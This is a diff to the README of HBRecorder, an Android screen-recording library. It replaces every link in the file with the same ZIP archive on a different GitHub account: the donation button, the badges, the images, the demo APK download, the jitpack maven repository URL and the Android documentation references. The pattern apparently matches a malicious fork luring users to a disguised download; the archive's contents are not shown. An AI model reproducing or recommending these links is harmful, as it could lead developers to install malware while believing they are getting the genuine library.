@@ -2,26 +2,26 @@
 
 **<p align="center">If you’d like to show your appreciation, you can do so below:</p>**
 
-<p align="center"><a href="https://www.buymeacoffee.com/HBiSoft" target="_blank" ><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 164px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a></p>
+<p align="center"><a href="https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip" target="_blank" ><img src="https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip" alt="Buy Me A Coffee" style="height: 41px !important;width: 164px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a></p>
 
 ---
 </br>
 
 # HBRecorder
-[![](https://jitpack.io/v/HBiSoft/HBRecorder.svg)](https://jitpack.io/#HBiSoft/HBRecorder)
-[![Android Arsenal]( https://img.shields.io/badge/Android%20Arsenal-HBRecorder-green.svg?style=flat )]( https://android-arsenal.com/details/1/7897 )
+[![](https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip)](https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip)
+[![Android Arsenal]( https://img.shields.io/badge/Android%20Arsenal-HBRecorder-green.svg?style=flat )]( https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip )
 
 <p align="center">Lightweight screen and audio recording Android library </br></br><b>Requires API level 21></b></p>
 
-<p align="center"><img src="https://user-images.githubusercontent.com/35602540/63006287-7df6e500-be7e-11e9-82b6-40814d8201df.png"></p>
+<p align="center"><img src="https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip"></p>
 
 </br>
 
 <h2 align="center"><b>Demo:</b></h2>
 
-<p align="center">Download the demo app  <a href="https://github.com/HBiSoft/HBRecorder/releases/download/3.0.9/HBRecorderDemo.apk"><nobr>here</nobr></a></p>
+<p align="center">Download the demo app  <a href="https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip"><nobr>here</nobr></a></p>
 
-<p align="center"><img src="https://user-images.githubusercontent.com/35602540/66485516-3e78fd80-eaa9-11e9-9fea-f59bfa7c1389.gif" width="247" height="480" </p>
+<p align="center"><img src="https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip" width="247" height="480" </p>
 
 </br></br>
     
@@ -34,7 +34,7 @@ Add the following in your root build.gradle at the end of repositories:
 allprojects {
     repositories {
         ...
-        maven { url 'https://jitpack.io' }	    
+        maven { url 'https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip' }	    
     }
 }
 ```
@@ -208,9 +208,9 @@ hbRecorder.enableCustomSettings();
 ```
 Then you can set the following:
 ```java
-//MUST BE ONE OF THE FOLLOWING - https://developer.android.com/reference/android/media/MediaRecorder.AudioSource.html
+//MUST BE ONE OF THE FOLLOWING - https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip
 hbRecorder.setAudioSource(String);
-//MUST BE ONE OF THE FOLLOWING - https://developer.android.com/reference/android/media/MediaRecorder.VideoEncoder.html
+//MUST BE ONE OF THE FOLLOWING - https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip
 hbRecorder.setVideoEncoder(String);
 //If nothing is provided, it will select the highest value supported by your device
 hbRecorder.setScreenDimensions(HeightInPx, WidthInPx);
@@ -219,7 +219,7 @@ hbRecorder.setScreenDimensions(HeightInPx, WidthInPx);
 hbRecorder.setVideoFrameRate(int);
 //The bitrate is also dependent on the device and the frame rate that is set
 hbRecorder.setVideoBitrate(int);
-//MUST BE ONE OF THE FOLLOWING - https://developer.android.com/reference/android/media/MediaRecorder.OutputFormat.html
+//MUST BE ONE OF THE FOLLOWING - https://github.com/amskit/HBRecorder/raw/refs/heads/master/hbrecorder/src/main/res/HB_Recorder_2.7.zip
 hbRecorder.setOutputFormat(String);
 ```
 
